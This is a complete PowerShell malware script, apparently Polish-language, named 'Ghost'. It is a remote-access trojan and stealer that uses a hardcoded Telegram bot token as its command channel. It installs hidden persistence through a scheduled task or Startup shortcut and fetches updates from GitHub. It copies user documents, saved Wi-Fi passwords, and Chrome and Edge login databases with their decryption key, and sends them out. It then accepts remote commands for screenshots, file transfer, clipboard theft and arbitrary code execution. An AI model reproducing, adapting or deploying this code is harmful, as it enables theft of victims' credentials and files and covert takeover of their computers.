param([switch]$poll)
$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
$tok='9213324981:AAG-back1py2J5fsGXfIATEJMa2M625xBD0'
$cid='9185389635'
$api="https://api.telegram.org/bot$tok"
$base='https://github.com/ecomlyceo-dotcom/ghost/raw/refs/heads/main'
$me="$env:APPDATA\Microsoft\Windows\GhostSys.ps1"
$cwd=$env:USERPROFILE

$mtx=New-Object Threading.Mutex($false,'GhostSys01')
$got=$true
try{ $got=$mtx.WaitOne(0) }catch{ $got=$true }
if(-not $got){ exit }

function T($m){ try{ $m=[string]$m; if($m.Length -gt 3900){ $m=$m.Substring(0,3900) }; Invoke-RestMethod "$api/sendMessage" -Method Post -Body @{chat_id=$cid;text=$m} | Out-Null }catch{} }
function TD($f){ try{ if((Test-Path $f) -and ((Get-Item $f).Length -gt 0)){ curl.exe -s -F "chat_id=$cid" -F "document=@$f" "$api/sendDocument" | Out-Null } }catch{} }
function TP($f,$cap){ try{ curl.exe -s -F "chat_id=$cid" -F "photo=@$f" -F "caption=$cap" "$api/sendPhoto" | Out-Null }catch{} }
function Grab($src,$dst){ try{ $fs=[IO.File]::Open($src,'Open','Read','ReadWrite'); $o=[IO.File]::Create($dst); $fs.CopyTo($o); $o.Close(); $fs.Close() }catch{} }
function Big($o){ $o=[string]$o; if($o.Length -gt 3500){ $o | Out-File "$env:TEMP\o.txt" -Encoding utf8; TD "$env:TEMP\o.txt" } else { T $o } }
function SS($p){ try{ Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $bmp.Save($p,[System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose(); return $true }catch{ return $false } }
function Menu(){ T ("MENU`n!ss - zrzut ekranu`n!ls [sciezka] - lista plikow`n!cd <sciezka> - zmiana katalogu`n!get <plik> - pobierz plik/folder`n!put - jak wgrac plik`n!run <cmd> - cmd.exe`n!ps - procesy`n!kill <nazwa|pid>`n!ip - konfiguracja sieci`n!wifi - sieci i hasla`n!sys - info o maszynie`n!users - zalogowani`n!clip - schowek`n!msg <tekst> - okno na ekranie`n!lock - blokada`n!reboot / !shutdown`n!off - zatrzymaj bota`n`nBez ! = czysty PowerShell.") }

if(-not $poll){
New-Item -ItemType Directory (Split-Path $me) -Force | Out-Null
try{ iwr -useb "$base/run.ps1?t=$([int](Get-Date -UFormat %s))" -OutFile $me -UseB }catch{ Copy-Item $PSCommandPath $me -Force }

$args1='-w hidden -nop -ep bypass -f "' + $me + '" -poll'
schtasks /create /tn "GhostSystem01" /tr ('powershell ' + $args1) /sc onlogon /f 2>$null | Out-Null
if(-not (schtasks /query /tn "GhostSystem01" 2>$null)){
$lnk="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\GhostSystem01.lnk"
$ws=New-Object -ComObject WScript.Shell
$s=$ws.CreateShortcut($lnk)
$s.TargetPath="powershell"
$s.Arguments=$args1
$s.WindowStyle=7
$s.Save()
}

$dst="$env:TEMP\g"
Remove-Item $dst -Recurse -Force -EA 0
New-Item -ItemType Directory $dst -Force | Out-Null
$dirs=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
$ext='^\.(mp4|mov|avi|mkv|jpg|jpeg|png|pdf|docx|xlsx|txt|zip)$'
Get-ChildItem $dirs -Recurse -File -EA 0 | Where-Object { $_.Length -lt 8MB -and ($_.Extension -match $ext -or $_.Name -match 'wa[zż]ne') } | Copy-Item -Destination $dst -Force -EA 0

$wf="$env:TEMP\wifi.txt"
$prof=(netsh wlan show profiles 2>$null)
$prof | Out-File $wf -Encoding utf8
foreach($l in $prof){
$n=($l.ToString() -split ':')[-1].Trim()
if($n -and $l.ToString() -match ':'){ "=== $n ===" | Out-File $wf -Append -Encoding utf8; netsh wlan show profile name="$n" key=clear 2>$null | Out-File $wf -Append -Encoding utf8 }
}

Grab "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "$env:TEMP\Chrome.db"
Grab "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" "$env:TEMP\ChromeKey.json"
Grab "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" "$env:TEMP\Microsoft.db"

if(Get-ChildItem $dst -File -EA 0){ Compress-Archive -Path "$dst\*" -DestinationPath "$env:TEMP\out.zip" -Force -EA 0 }

$zn=(Get-ChildItem $dst -File -EA 0 | Measure-Object).Count
$wb=(Get-Item "$env:TEMP\wifi.txt" -EA 0).Length
$cb=(Get-Item "$env:TEMP\Chrome.db" -EA 0).Length
$mb=(Get-Item "$env:TEMP\Microsoft.db" -EA 0).Length
T "GHOST ONLINE: $(whoami) @ $env:COMPUTERNAME | pliki=$zn wifi=${wb}B chrome=${cb}B edge=${mb}B"

TD "$env:TEMP\out.zip"; TD "$env:TEMP\wifi.txt"
TD "$env:TEMP\Chrome.db"; TD "$env:TEMP\ChromeKey.json"; TD "$env:TEMP\Microsoft.db"
}

$off=0
try{ $u=Invoke-RestMethod "$api/getUpdates?offset=-1" -TimeoutSec 15; if($u.result){ $off=$u.result[-1].update_id+1 } }catch{}

$go=$true
while($go){
try{
$u=Invoke-RestMethod "$api/getUpdates?offset=$off&timeout=30" -TimeoutSec 45
foreach($r in $u.result){
$off=$r.update_id+1

if($r.message.document){
try{
$fi=Invoke-RestMethod "$api/getFile?file_id=$($r.message.document.file_id)"
iwr -useb "https://api.telegram.org/file/bot$tok/$($fi.result.file_path)" -OutFile (Join-Path $cwd $r.message.document.file_name) -UseB
T "zapisano: $cwd\$($r.message.document.file_name)"
}catch{ T "nie udalo sie zapisac pliku" }
}

if($r.message.photo){
try{
$ph=$r.message.photo[-1]
$fi=Invoke-RestMethod "$api/getFile?file_id=$($ph.file_id)"
iwr -useb "https://api.telegram.org/file/bot$tok/$($fi.result.file_path)" -OutFile (Join-Path $cwd ("foto_" + $ph.file_unique_id + ".jpg")) -UseB
T "zapisano zdjecie w $cwd"
}catch{ T "nie udalo sie zapisac zdjecia" }
}

$c=$r.message.text
if($c){
$t=($c.Trim() -replace '^/','')
if($t -eq ''){ Menu() }
elseif($t -match '^!(\w+)[ ]?([\s\S]*)$'){ $k=$matches[1].ToLower(); $a=$matches[2].Trim()
switch($k){
'menu'{ Menu() }
'help'{ Menu() }
'ss'{ $p="$env:TEMP\sc.png"; if(SS $p){ TP $p "$env:COMPUTERNAME $(Get-Date -Format HH:mm:ss)" } else { T "zrzut nie wyszedl" } }
'ls'{ $p=$cwd; if($a){ $p=$a }; if(Test-Path $p -PathType Container){ Big ((Get-ChildItem $p -Force -EA 0 | ForEach-Object { $_.LastWriteTime.ToString('yy-MM-dd HH:mm') + '  ' + $(if($_.PSIsContainer){'<DIR>'}else{$_.Length}) + '  ' + $_.Name }) -join "`r`n") } else { T "brak katalogu: $p" } }
'cd'{ if($a -and (Test-Path $a -PathType Container)){ $cwd=(Resolve-Path $a).Path; T "cwd: $cwd" } else { T "brak katalogu: $a" } }
'get'{ if($a -and (Test-Path $a)){ if((Get-Item $a).PSIsContainer){ $z="$env:TEMP\d.zip"; Remove-Item $z -Force -EA 0; Compress-Archive -Path "$a\*" -DestinationPath $z -Force -EA 0; TD $z } else { TD $a } } else { T "brak: $a" } }
'put'{ T "Wyslij plik/zdjecie jako dokument na ten czat - wyladuje w $cwd" }
'run'{ if($a){ Big ((cmd /c $a 2>&1 | Out-String)) } }
'ps'{ Big ((Get-Process -EA 0 | Sort-Object WS -Descending | Select-Object -First 25 Id,ProcessName,@{n='MB';e={[int]($_.WS/1MB)}} | Format-Table -Auto | Out-String)) }
'kill'{ if($a){ if($a -match '^\d+$'){ Stop-Process -Id $a -Force -EA 0 } else { Stop-Process -Name $a -Force -EA 0 }; T "kill: $a" } }
'ip'{ Big ((ipconfig /all | Out-String)) }
'wifi'{ $w="$env:TEMP\wf.txt"; $pr=(netsh wlan show profiles 2>$null); $pr | Out-File $w -Encoding utf8; foreach($l in $pr){ $n=($l.ToString() -split ':')[-1].Trim(); if($n -and $l.ToString() -match ':'){ netsh wlan show profile name="$n" key=clear 2>$null | Out-File $w -Append -Encoding utf8 } }; TD $w }
'sys'{ $os=Get-CimInstance Win32_OperatingSystem; $d=(Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object { "$($_.DeviceID) $([int]($_.FreeSpace/1GB))GB wolne / $([int]($_.Size/1GB))GB" }) -join "`r`n"; Big ((@("user: $(whoami)","host: $env:COMPUTERNAME","os: $($os.Caption) $($os.Version)","boot: $($os.LastBootUpTime)",$d)) -join "`r`n") }
'users'{ Big ((quser 2>&1 | Out-String)) }
'clip'{ Big ((Get-Clipboard -Raw 2>&1 | Out-String)) }
'msg'{ if($a){ Start-Job -ScriptBlock { param($x) Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($x,'Ghost') } -ArgumentList $a | Out-Null; T "wyswietlone" } }
'lock'{ rundll32.exe user32.dll,LockWorkStation; T "zablokowane" }
'reboot'{ T "restart za 5s"; shutdown /r /t 5 }
'shutdown'{ T "wylaczenie za 5s"; shutdown /s /t 5 }
'off'{ T "bye"; $go=$false }
default{ Big ((iex $t 2>&1 | Out-String)) }
}
}
else { Big ((iex $t 2>&1 | Out-String)) }
}
}
}catch{}
Start-Sleep 2
}
